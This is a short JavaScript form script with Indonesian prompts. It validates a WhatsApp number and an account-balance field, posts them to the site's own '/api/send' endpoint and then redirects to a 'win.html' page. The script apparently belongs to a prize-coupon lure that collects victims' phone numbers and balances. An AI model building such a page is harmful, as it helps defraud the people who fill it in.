document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("formData");
  const submitBtn = document.getElementById("kirim");
  let isSubmitting = false;

  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    if (isSubmitting) {
      alert("Tunggu sebentar ya, sedang memproses...");
      return;
    }

    isSubmitting = true;
    submitBtn.disabled = true;
    submitBtn.innerText = "Memproses Cetak Kupon...";

    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    // ✋ Validasi manual di client-side
    const noWA = data.b || '';
    const saldo = data.c || '';

    if (!/^08[0-9]{8,13}$/.test(noWA)) {
      alert("Nomor WhatsApp tidak valid!");
      resetBtn();
      return;
    }

    if (saldo.length < 3) {
      alert("Saldo terlalu kecil untuk diikutkan.");
      resetBtn();
      return;
    }

    // ✅ Kirim ke backend
    try {
      const res = await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        credentials: 'include',
        body: JSON.stringify(data)
      });

      const json = await res.json();

      if (json.success) {
        vibr(180);
        setTimeout(() => {
          window.location.href = 'win.html';
        }, 1000);
      } else {
        alert(json.message || "Gagal mengirim. Coba lagi.");
      }
    } catch (err) {
      console.error("Error:", err);
      alert("Terjadi kesalahan saat kirim data.");
    }

    resetBtn();
  });

  function resetBtn() {
    isSubmitting = false;
    submitBtn.disabled = false;
    submitBtn.innerText = "Cetak Kupon";
  }
});
